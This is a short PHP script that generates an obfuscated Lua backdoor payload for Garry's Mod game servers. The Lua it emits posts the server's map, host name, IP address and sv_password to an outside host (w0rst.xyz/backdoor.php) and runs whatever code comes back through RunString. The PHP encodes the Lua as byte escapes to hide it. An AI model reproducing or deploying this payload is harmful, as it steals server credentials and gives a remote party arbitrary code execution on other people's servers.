<?php 

error_reporting(0);
ini_set('display_errors', 0);

$type = $_GET['type']; // privacy
$token = $_GET['token']; // the token 

if($token && $type == "public" || "private") {
    $lua = "if game.IsDedicated() then http.Post('https://w0rst.xyz/project/api/backdoor.php?type=$type&token=$token',{map=game.GetMap(),server=GetHostName(),serverip=game.GetIPAddress(),gamemode=engine.ActiveGamemode(),password=GetConVar('sv_password'):GetString()},RunString) end";

    $bytes = unpack('C*', $lua); // turns text into bytes

    // turn this into something the game will run while slightly encrypting code
    echo("RunString('"); foreach($bytes as $byte) { echo("\\$byte"); } echo("')");
}

?> 